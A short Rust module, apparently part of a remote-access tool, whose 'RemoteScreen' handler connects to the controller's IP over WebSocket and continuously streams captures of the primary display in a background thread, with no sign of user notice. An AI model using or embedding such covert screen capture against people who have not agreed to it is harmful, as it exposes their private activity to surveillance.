use scrap::{Capturer, Display};
use tungstenite::{connect, Message};

use crate::handlers::func::Function;
use crate::Socket;

pub struct RemoteScreen;

impl Function for RemoteScreen {
    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
        let url = format!("ws://{}:4042", ctx.conn.ip);
        let (mut socket, _response) = connect(&url).unwrap();
        println!("Socket connected");

        std::thread::spawn(move || {
            start_streaming_new(&mut socket);
        });
        Ok(())
    }
}

fn start_streaming_new(socket: &mut Socket) {
    let display = Display::primary().unwrap();
    let mut capturer = Capturer::new(display).unwrap();
    loop {
        match capturer.frame() {
            Ok(frame) => {
                socket.send(Message::Binary(frame.to_vec())).unwrap();
            }
            Err(error) => {
                if error.kind() == std::io::ErrorKind::WouldBlock {
                    std::thread::sleep(std::time::Duration::new(0, 1_000_000_000u32 / 60));
                    continue;
                }
            }
        }
    }
}
